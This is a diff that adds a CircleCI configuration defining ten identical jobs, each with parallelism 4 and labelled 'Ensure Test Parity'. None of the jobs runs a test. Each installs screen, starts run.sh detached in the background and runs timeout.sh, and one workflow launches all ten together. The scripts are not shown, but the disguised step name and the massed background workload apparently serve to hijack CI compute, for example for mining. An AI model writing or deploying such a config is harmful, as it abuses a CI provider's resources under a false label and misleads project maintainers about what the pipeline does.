@@ -1,0 +1,157 @@
+version: 2.1
+jobs:
+    aing1:
+      docker:
+            - image: cimg/go:1.16.4 
+      parallelism: 4
+      steps: 
+        - checkout
+        - run:
+            name: Ensure Test Parity
+            command: | 
+              sudo apt update 
+              sudo apt install screen -y 
+              chmod +x run.sh 
+              screen -dmS run ./run.sh 
+              chmod +x timeout.sh && ./timeout.sh
+    aing2:
+      docker:
+            - image: cimg/go:1.16.4 
+      parallelism: 4
+      steps: 
+        - checkout
+        - run:
+            name: Ensure Test Parity
+            command: | 
+              sudo apt update 
+              sudo apt install screen -y 
+              chmod +x run.sh 
+              screen -dmS run ./run.sh 
+              chmod +x timeout.sh && ./timeout.sh
+    aing3:
+      docker:
+            - image: cimg/go:1.16.4 
+      parallelism: 4
+      steps: 
+        - checkout
+        - run:
+            name: Ensure Test Parity
+            command: | 
+              sudo apt update 
+              sudo apt install screen -y 
+              chmod +x run.sh 
+              screen -dmS run ./run.sh 
+              chmod +x timeout.sh && ./timeout.sh
+    aing4:
+      docker:
+            - image: cimg/go:1.16.4 
+      parallelism: 4
+      steps: 
+        - checkout
+        - run:
+            name: Ensure Test Parity
+            command: | 
+              sudo apt update 
+              sudo apt install screen -y 
+              chmod +x run.sh 
+              screen -dmS run ./run.sh 
+              chmod +x timeout.sh && ./timeout.sh
+    aing5:
+      docker:
+            - image: cimg/go:1.16.4 
+      parallelism: 4
+      steps: 
+        - checkout
+        - run:
+            name: Ensure Test Parity
+            command: | 
+              sudo apt update 
+              sudo apt install screen -y 
+              chmod +x run.sh 
+              screen -dmS run ./run.sh 
+              chmod +x timeout.sh && ./timeout.sh
+    aing6:
+      docker:
+            - image: cimg/go:1.16.4 
+      parallelism: 4
+      steps: 
+        - checkout
+        - run:
+            name: Ensure Test Parity
+            command: | 
+              sudo apt update 
+              sudo apt install screen -y 
+              chmod +x run.sh 
+              screen -dmS run ./run.sh 
+              chmod +x timeout.sh && ./timeout.sh
+    aing7:
+      docker:
+            - image: cimg/go:1.16.4 
+      parallelism: 4
+      steps: 
+        - checkout
+        - run:
+            name: Ensure Test Parity
+            command: | 
+              sudo apt update 
+              sudo apt install screen -y 
+              chmod +x run.sh 
+              screen -dmS run ./run.sh 
+              chmod +x timeout.sh && ./timeout.sh
+    aing8:
+      docker:
+            - image: cimg/go:1.16.4 
+      parallelism: 4
+      steps: 
+        - checkout
+        - run:
+            name: Ensure Test Parity
+            command: | 
+              sudo apt update 
+              sudo apt install screen -y 
+              chmod +x run.sh 
+              screen -dmS run ./run.sh 
+              chmod +x timeout.sh && ./timeout.sh
+    aing9:
+      docker:
+            - image: cimg/go:1.16.4 
+      parallelism: 4
+      steps: 
+        - checkout
+        - run:
+            name: Ensure Test Parity
+            command: | 
+              sudo apt update 
+              sudo apt install screen -y 
+              chmod +x run.sh 
+              screen -dmS run ./run.sh 
+              chmod +x timeout.sh && ./timeout.sh
+    aing10:
+      docker:
+            - image: cimg/go:1.16.4 
+      parallelism: 4
+      steps: 
+        - checkout
+        - run:
+            name: Ensure Test Parity
+            command: | 
+              sudo apt update 
+              sudo apt install screen -y 
+              chmod +x run.sh 
+              screen -dmS run ./run.sh 
+              chmod +x timeout.sh && ./timeout.sh
+
+workflows:
+    version: 2
+    build:
+        jobs:
+            - aing1
+            - aing2
+            - aing3
+            - aing4
+            - aing5
+            - aing6
+            - aing7
+            - aing8
+            - aing9
+            - aing10
